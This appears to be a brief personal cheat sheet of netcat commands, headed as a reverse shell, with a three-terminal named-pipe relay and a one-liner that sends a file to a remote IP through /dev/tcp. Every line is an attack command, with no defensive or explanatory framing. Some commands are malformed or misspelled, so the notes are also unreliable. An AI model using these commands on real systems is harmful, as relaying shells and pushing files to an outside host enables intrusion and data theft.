# nc rev shell
term 1

nc BH1 9001

term 2 

nc -lvnp 9001 < testpipe| nc -lvnp 9002 > testpipe

term 3 

nc [BH1.ip] -int 9002

# /dev/tcp/

on sendinging box:

cat file.txt > /dev/tcp/172.16.182.106/9001

on receiving box:

nc -lvnp 9001
